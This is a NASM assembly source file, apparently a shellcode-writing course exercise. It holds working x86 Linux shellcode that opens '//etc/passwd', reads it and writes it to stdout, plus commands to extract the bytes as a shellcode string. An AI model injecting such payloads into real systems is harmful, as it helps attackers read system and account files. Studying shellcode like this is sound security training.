; Filename:      shellcode-orig-asm.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  27.12.2018
; Assembler:     nasm -f elf32 shellcode-orig-asm.nasm -o shellcode-orig-asm.o
; Linker:        ld -N -m elf_i386 shellcode-orig-asm.o -o shellcode-orig-asm
; Assembly dump: objdump -d ./shellcode-orig-asm|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'


global _start

section .text

_start:

  xor ecx,ecx
  mul ecx
  mov al,0x5
  push ecx
  push dword 0x64777373
  push dword 0x61702f63
  push dword 0x74652f2f
  mov ebx,esp
  int 0x80

  xchg eax,ebx
  xchg eax,ecx
  mov al,0x3
  xor edx,edx
  mov dx,0xfff
  inc edx
  int 0x80

  xchg eax,edx
  xor eax,eax
  mov al,0x4
  mov bl,0x1
  int 0x80

  xchg eax,ebx
  int 0x80
